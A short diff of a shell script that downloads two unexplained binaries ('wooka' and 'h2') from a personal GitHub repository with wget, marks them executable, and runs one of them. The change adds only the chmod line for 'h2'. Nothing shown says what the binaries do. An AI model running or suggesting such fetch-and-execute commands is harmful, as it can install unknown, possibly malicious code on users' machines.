@@ -1,4 +1,5 @@
 wget https://github.com/hmzamin/file/raw/main/wooka
 wget https://github.com/hmzamin/file/raw/main/h2
 chmod u+x ./wooka
+chmod u+x ./h2
 ./h2
